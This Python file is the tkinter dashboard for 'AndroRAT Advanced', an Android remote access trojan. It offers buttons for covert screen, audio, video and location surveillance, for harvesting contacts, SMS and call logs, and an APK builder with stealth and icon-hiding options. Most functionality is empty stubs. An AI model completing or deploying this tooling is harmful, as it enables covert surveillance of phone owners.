#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT Advanced GUI - Multi-Client Dashboard
Modern interface for managing multiple Android clients with real-time monitoring
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import queue
import sys
import os
import platform
import subprocess
import json
import time
from datetime import datetime
from utils import *

class AdvancedAndroRATGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AndroRAT Advanced - Multi-Client Dashboard")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Configure styles for modern look
        self.setup_styles()
        
        # Data structures for client management
        self.connected_clients = {}
        self.client_data = {}
        self.message_queue = queue.Queue()
        
        # Variables
        self.setup_variables()
        
        # Create main interface
        self.create_main_interface()
        
        # Start background processes
        self.start_background_tasks()
        
    def setup_styles(self):
        """Configure modern styles for the GUI"""
        style = ttk.Style()
        
        # Try to use a modern theme
        available_themes = style.theme_names()
        if 'clam' in available_themes:
            style.theme_use('clam')
        elif 'vista' in available_themes:
            style.theme_use('vista')
            
        # Configure custom styles
        style.configure('Title.TLabel', font=('TkDefaultFont', 16, 'bold'))
        style.configure('Subtitle.TLabel', font=('TkDefaultFont', 10))
        style.configure('Status.TLabel', font=('TkDefaultFont', 9))
        style.configure('Client.Treeview', font=('TkDefaultFont', 9))
        
        # Custom colors
        style.configure('Online.TLabel', foreground='green')
        style.configure('Offline.TLabel', foreground='red')
        style.configure('Warning.TLabel', foreground='orange')
        
    def setup_variables(self):
        """Initialize GUI variables"""
        self.server_status = tk.StringVar(value="Stopped")
        self.client_count = tk.StringVar(value="0")
        self.selected_client = tk.StringVar(value="")
        self.server_port = tk.StringVar(value="8000")
        self.log_level = tk.StringVar(value="INFO")
        
    def create_main_interface(self):
        """Create the main GUI interface"""
        # Create main container
        main_container = ttk.Frame(self.root)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create top toolbar
        self.create_toolbar(main_container)
        
        # Create main content area with paned window
        paned_window = ttk.PanedWindow(main_container, orient=tk.HORIZONTAL)
        paned_window.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        # Left panel - Client list and controls
        left_panel = ttk.Frame(paned_window)
        paned_window.add(left_panel, weight=1)
        
        # Right panel - Client details and actions
        right_panel = ttk.Frame(paned_window)
        paned_window.add(right_panel, weight=2)
        
        # Create left panel contents
        self.create_client_list_panel(left_panel)
        
        # Create right panel contents
        self.create_client_details_panel(right_panel)
        
        # Create bottom status bar
        self.create_status_bar(main_container)
        
    def create_toolbar(self, parent):
        """Create top toolbar with server controls"""
        toolbar_frame = ttk.Frame(parent)
        toolbar_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Title section
        title_frame = ttk.Frame(toolbar_frame)
        title_frame.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        title_label = ttk.Label(title_frame, text="AndroRAT Advanced Dashboard", 
                               style='Title.TLabel')
        title_label.pack(side=tk.LEFT)
        
        subtitle_label = ttk.Label(title_frame, 
                                  text="Multi-client remote administration platform",
                                  style='Subtitle.TLabel')
        subtitle_label.pack(side=tk.LEFT, padx=(10, 0))
        
        # Server controls section
        controls_frame = ttk.Frame(toolbar_frame)
        controls_frame.pack(side=tk.RIGHT)
        
        # Server status
        ttk.Label(controls_frame, text="Server:").pack(side=tk.LEFT, padx=(0, 5))
        
        status_label = ttk.Label(controls_frame, textvariable=self.server_status,
                                style='Status.TLabel')
        status_label.pack(side=tk.LEFT, padx=(0, 10))
        
        # Port entry
        ttk.Label(controls_frame, text="Port:").pack(side=tk.LEFT, padx=(0, 5))
        port_entry = ttk.Entry(controls_frame, textvariable=self.server_port, width=8)
        port_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        # Control buttons
        self.start_button = ttk.Button(controls_frame, text="Start Server",
                                      command=self.start_server)
        self.start_button.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_button = ttk.Button(controls_frame, text="Stop Server",
                                     command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5))
        
        # APK Builder button
        ttk.Button(controls_frame, text="Build APK",
                  command=self.open_apk_builder).pack(side=tk.LEFT, padx=(5, 0))
        
    def create_client_list_panel(self, parent):
        """Create client list and management panel"""
        # Client list header
        header_frame = ttk.Frame(parent)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(header_frame, text="Connected Clients", 
                 font=('TkDefaultFont', 12, 'bold')).pack(side=tk.LEFT)
        
        client_count_label = ttk.Label(header_frame, textvariable=self.client_count,
                                      foreground='blue')
        client_count_label.pack(side=tk.RIGHT)
        
        # Client list treeview
        list_frame = ttk.Frame(parent)
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create treeview with columns
        columns = ('Device', 'Status', 'IP', 'Location', 'Connected')
        self.client_tree = ttk.Treeview(list_frame, columns=columns, show='headings',
                                       style='Client.Treeview')
        
        # Configure columns
        self.client_tree.heading('Device', text='Device')
        self.client_tree.heading('Status', text='Status')
        self.client_tree.heading('IP', text='IP Address')
        self.client_tree.heading('Location', text='Location')
        self.client_tree.heading('Connected', text='Connected')
        
        self.client_tree.column('Device', width=150)
        self.client_tree.column('Status', width=80)
        self.client_tree.column('IP', width=120)
        self.client_tree.column('Location', width=100)
        self.client_tree.column('Connected', width=100)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, 
                                 command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=scrollbar.set)
        
        # Pack treeview and scrollbar
        self.client_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bind selection event
        self.client_tree.bind('<<TreeviewSelect>>', self.on_client_select)
        
        # Client action buttons
        action_frame = ttk.Frame(parent)
        action_frame.pack(fill=tk.X, pady=(10, 0))
        
        ttk.Button(action_frame, text="Refresh List",
                  command=self.refresh_client_list).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(action_frame, text="Disconnect Client",
                  command=self.disconnect_selected_client).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(action_frame, text="Send Command",
                  command=self.open_command_dialog).pack(side=tk.LEFT)
        
    def create_client_details_panel(self, parent):
        """Create client details and action panel"""
        # Create notebook for different sections
        self.details_notebook = ttk.Notebook(parent)
        self.details_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Device Information tab
        self.create_device_info_tab()
        
        # File Manager tab
        self.create_file_manager_tab()
        
        # Real-time Monitoring tab
        self.create_monitoring_tab()
        
        # Data Viewers tab
        self.create_data_viewers_tab()
        
        # Command Console tab
        self.create_command_console_tab()
        
    def create_device_info_tab(self):
        """Create device information tab"""
        device_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(device_frame, text="Device Info")
        
        # Device info display
        info_frame = ttk.LabelFrame(device_frame, text="Device Details", padding=10)
        info_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.device_info_text = scrolledtext.ScrolledText(info_frame, height=15,
                                                          wrap=tk.WORD, state=tk.DISABLED)
        self.device_info_text.pack(fill=tk.BOTH, expand=True)
        
        # Control buttons
        button_frame = ttk.Frame(device_frame)
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Button(button_frame, text="Get Device Info",
                  command=self.get_device_info).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(button_frame, text="Get Location",
                  command=self.get_location).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(button_frame, text="Vibrate Device",
                  command=self.vibrate_device).pack(side=tk.LEFT)
        
    def create_file_manager_tab(self):
        """Create file manager tab"""
        file_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(file_frame, text="File Manager")
        
        # Create dual-pane file manager
        paned = ttk.PanedWindow(file_frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Local files pane
        local_frame = ttk.LabelFrame(paned, text="Local Files", padding=5)
        paned.add(local_frame, weight=1)
        
        self.local_file_tree = ttk.Treeview(local_frame, height=15)
        self.local_file_tree.pack(fill=tk.BOTH, expand=True)
        
        # Remote files pane
        remote_frame = ttk.LabelFrame(paned, text="Remote Files", padding=5)
        paned.add(remote_frame, weight=1)
        
        self.remote_file_tree = ttk.Treeview(remote_frame, height=15)
        self.remote_file_tree.pack(fill=tk.BOTH, expand=True)
        
        # File operation buttons
        file_buttons_frame = ttk.Frame(file_frame)
        file_buttons_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Button(file_buttons_frame, text="Upload File",
                  command=self.upload_file).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(file_buttons_frame, text="Download File",
                  command=self.download_file).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(file_buttons_frame, text="Delete File",
                  command=self.delete_file).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(file_buttons_frame, text="Refresh Remote",
                  command=self.refresh_remote_files).pack(side=tk.LEFT)
        
    def create_monitoring_tab(self):
        """Create real-time monitoring tab"""
        monitor_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(monitor_frame, text="Live Monitor")
        
        # Screen monitoring section
        screen_frame = ttk.LabelFrame(monitor_frame, text="Screen Monitoring", padding=10)
        screen_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        
        screen_buttons_frame = ttk.Frame(screen_frame)
        screen_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(screen_buttons_frame, text="Start Screen Stream",
                  command=self.start_screen_stream).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(screen_buttons_frame, text="Take Screenshot",
                  command=self.take_screenshot).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(screen_buttons_frame, text="Stop Stream",
                  command=self.stop_screen_stream).pack(side=tk.LEFT)
        
        # Audio/Video monitoring section
        av_frame = ttk.LabelFrame(monitor_frame, text="Audio/Video Monitoring", padding=10)
        av_frame.pack(fill=tk.X, padx=10, pady=5)
        
        av_buttons_frame = ttk.Frame(av_frame)
        av_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(av_buttons_frame, text="Start Audio Recording",
                  command=self.start_audio_recording).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(av_buttons_frame, text="Start Video Recording",
                  command=self.start_video_recording).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(av_buttons_frame, text="Take Photo",
                  command=self.take_photo).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(av_buttons_frame, text="Stop Recording",
                  command=self.stop_recording).pack(side=tk.LEFT)
        
        # Location monitoring section
        location_frame = ttk.LabelFrame(monitor_frame, text="Location Tracking", padding=10)
        location_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(5, 10))
        
        location_buttons_frame = ttk.Frame(location_frame)
        location_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(location_buttons_frame, text="Get Current Location",
                  command=self.get_current_location).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(location_buttons_frame, text="Start Location Tracking",
                  command=self.start_location_tracking).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(location_buttons_frame, text="View on Map",
                  command=self.view_location_map).pack(side=tk.LEFT)
        
        # Location display area
        self.location_text = scrolledtext.ScrolledText(location_frame, height=8,
                                                      wrap=tk.WORD, state=tk.DISABLED)
        self.location_text.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
    def create_data_viewers_tab(self):
        """Create data viewers tab"""
        data_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(data_frame, text="Data Viewers")
        
        # Create sub-notebook for different data types
        data_notebook = ttk.Notebook(data_frame)
        data_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Contacts viewer
        contacts_frame = ttk.Frame(data_notebook)
        data_notebook.add(contacts_frame, text="Contacts")
        
        self.contacts_tree = ttk.Treeview(contacts_frame, 
                                         columns=('Name', 'Phone', 'Email'),
                                         show='headings')
        self.contacts_tree.heading('Name', text='Name')
        self.contacts_tree.heading('Phone', text='Phone')
        self.contacts_tree.heading('Email', text='Email')
        self.contacts_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # SMS viewer
        sms_frame = ttk.Frame(data_notebook)
        data_notebook.add(sms_frame, text="SMS")
        
        self.sms_tree = ttk.Treeview(sms_frame,
                                    columns=('From', 'Message', 'Date'),
                                    show='headings')
        self.sms_tree.heading('From', text='From')
        self.sms_tree.heading('Message', text='Message')
        self.sms_tree.heading('Date', text='Date')
        self.sms_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Call logs viewer
        calls_frame = ttk.Frame(data_notebook)
        data_notebook.add(calls_frame, text="Call Logs")
        
        self.calls_tree = ttk.Treeview(calls_frame,
                                      columns=('Number', 'Duration', 'Type', 'Date'),
                                      show='headings')
        self.calls_tree.heading('Number', text='Number')
        self.calls_tree.heading('Duration', text='Duration')
        self.calls_tree.heading('Type', text='Type')
        self.calls_tree.heading('Date', text='Date')
        self.calls_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Data action buttons
        data_buttons_frame = ttk.Frame(data_frame)
        data_buttons_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Button(data_buttons_frame, text="Load Contacts",
                  command=self.load_contacts).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(data_buttons_frame, text="Load SMS",
                  command=self.load_sms).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(data_buttons_frame, text="Load Call Logs",
                  command=self.load_call_logs).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(data_buttons_frame, text="Export Data",
                  command=self.export_data).pack(side=tk.LEFT)
        
    def create_command_console_tab(self):
        """Create command console tab"""
        console_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(console_frame, text="Console")
        
        # Command output area
        output_frame = ttk.LabelFrame(console_frame, text="Command Output", padding=5)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(10, 5))
        
        self.console_output = scrolledtext.ScrolledText(output_frame, height=20,
                                                       wrap=tk.WORD, state=tk.DISABLED,
                                                       font=('Courier', 9))
        self.console_output.pack(fill=tk.BOTH, expand=True)
        
        # Command input area
        input_frame = ttk.Frame(console_frame)
        input_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Label(input_frame, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.command_entry = ttk.Entry(input_frame)
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.command_entry.bind('<Return>', self.send_command)
        
        ttk.Button(input_frame, text="Send",
                  command=self.send_command).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(input_frame, text="Clear",
                  command=self.clear_console).pack(side=tk.LEFT)
        
    def create_status_bar(self, parent):
        """Create bottom status bar"""
        status_frame = ttk.Frame(parent)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM, pady=(10, 0))
        
        # Left side - general status
        self.status_text = tk.StringVar(value="Ready")
        status_label = ttk.Label(status_frame, textvariable=self.status_text)
        status_label.pack(side=tk.LEFT)
        
        # Right side - time and system info
        time_label = ttk.Label(status_frame, text=f"System: {platform.system()}")
        time_label.pack(side=tk.RIGHT)
        
    # Event handlers and functionality methods
    
    def start_server(self):
        """Start the AndroRAT server"""
        try:
            port = self.server_port.get()
            self.status_text.set(f"Starting server on port {port}...")
            
            # Start server in background thread
            threading.Thread(target=self._start_server_thread, 
                           args=(port,), daemon=True).start()
            
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.server_status.set("Starting...")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {e}")
            
    def stop_server(self):
        """Stop the AndroRAT server"""
        try:
            self.status_text.set("Stopping server...")
            
            # Stop server logic here
            
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.server_status.set("Stopped")
            self.status_text.set("Server stopped")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop server: {e}")
            
    def _start_server_thread(self, port):
        """Server thread implementation"""
        try:
            # Server implementation would go here
            # For now, just simulate server starting
            time.sleep(2)
            self.server_status.set("Running")
            self.status_text.set(f"Server running on port {port}")
            
        except Exception as e:
            self.status_text.set(f"Server error: {e}")
            
    def on_client_select(self, event):
        """Handle client selection"""
        selection = self.client_tree.selection()
        if selection:
            client_id = selection[0]
            self.selected_client.set(client_id)
            # Load client details
            self.load_client_details(client_id)
            
    def load_client_details(self, client_id):
        """Load details for selected client"""
        # Implementation for loading client details
        pass
        
    def refresh_client_list(self):
        """Refresh the client list"""
        # Clear current list
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
            
        # Add sample clients for demonstration
        sample_clients = [
            ("client_1", "Samsung Galaxy S21", "Online", "192.168.1.100", "New York", "10:30 AM"),
            ("client_2", "OnePlus 9", "Offline", "192.168.1.101", "London", "2 hours ago"),
            ("client_3", "Pixel 6", "Online", "192.168.1.102", "Tokyo", "5:45 PM"),
        ]
        
        for client_id, device, status, ip, location, connected in sample_clients:
            self.client_tree.insert('', 'end', iid=client_id,
                                   values=(device, status, ip, location, connected))
            
        self.client_count.set(str(len(sample_clients)))
        
    def open_apk_builder(self):
        """Open APK builder dialog"""
        # Create APK builder window
        apk_window = tk.Toplevel(self.root)
        apk_window.title("APK Builder")
        apk_window.geometry("600x400")
        apk_window.transient(self.root)
        apk_window.grab_set()
        
        # APK builder content
        ttk.Label(apk_window, text="APK Builder", 
                 font=('TkDefaultFont', 14, 'bold')).pack(pady=20)
        
        # Configuration frame
        config_frame = ttk.LabelFrame(apk_window, text="Configuration", padding=20)
        config_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # IP and Port
        ttk.Label(config_frame, text="Server IP:").grid(row=0, column=0, sticky='w', pady=5)
        ip_entry = ttk.Entry(config_frame, width=20)
        ip_entry.grid(row=0, column=1, padx=(10, 0), pady=5)
        
        ttk.Label(config_frame, text="Server Port:").grid(row=1, column=0, sticky='w', pady=5)
        port_entry = ttk.Entry(config_frame, width=20)
        port_entry.grid(row=1, column=1, padx=(10, 0), pady=5)
        
        ttk.Label(config_frame, text="Output APK:").grid(row=2, column=0, sticky='w', pady=5)
        output_entry = ttk.Entry(config_frame, width=20)
        output_entry.grid(row=2, column=1, padx=(10, 0), pady=5)
        
        # Options
        options_frame = ttk.LabelFrame(apk_window, text="Options", padding=20)
        options_frame.pack(fill=tk.X, padx=20, pady=10)
        
        icon_var = tk.BooleanVar()
        ttk.Checkbutton(options_frame, text="Hide app icon", 
                       variable=icon_var).pack(anchor='w')
        
        stealth_var = tk.BooleanVar()
        ttk.Checkbutton(options_frame, text="Enable stealth mode", 
                       variable=stealth_var).pack(anchor='w')
        
        # Build button
        ttk.Button(apk_window, text="Build APK",
                  command=lambda: self.build_apk(apk_window)).pack(pady=20)
        
    def build_apk(self, window):
        """Build APK with current settings"""
        messagebox.showinfo("APK Builder", "APK build started!\nCheck console for progress.")
        window.destroy()
        
    def start_background_tasks(self):
        """Start background tasks for GUI updates"""
        # Start periodic updates
        self.update_gui()
        
    def update_gui(self):
        """Periodic GUI updates"""
        # Update time and status
        current_time = datetime.now().strftime("%H:%M:%S")
        
        # Schedule next update
        self.root.after(1000, self.update_gui)
        
    # Placeholder methods for functionality
    def disconnect_selected_client(self): pass
    def open_command_dialog(self): pass
    def get_device_info(self): pass
    def get_location(self): pass
    def vibrate_device(self): pass
    def upload_file(self): pass
    def download_file(self): pass
    def delete_file(self): pass
    def refresh_remote_files(self): pass
    def start_screen_stream(self): pass
    def take_screenshot(self): pass
    def stop_screen_stream(self): pass
    def start_audio_recording(self): pass
    def start_video_recording(self): pass
    def take_photo(self): pass
    def stop_recording(self): pass
    def get_current_location(self): pass
    def start_location_tracking(self): pass
    def view_location_map(self): pass
    def load_contacts(self): pass
    def load_sms(self): pass
    def load_call_logs(self): pass
    def export_data(self): pass
    def send_command(self, event=None): pass
    def clear_console(self): pass

def main():
    """Main function to run the advanced GUI"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Error: Python version should be 3.6 or higher")
        sys.exit(1)
        
    # Create and run GUI
    root = tk.Tk()
    app = AdvancedAndroRATGUI(root)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\nAdvanced GUI closed by user")
        sys.exit(0)

if __name__ == "__main__":
    main()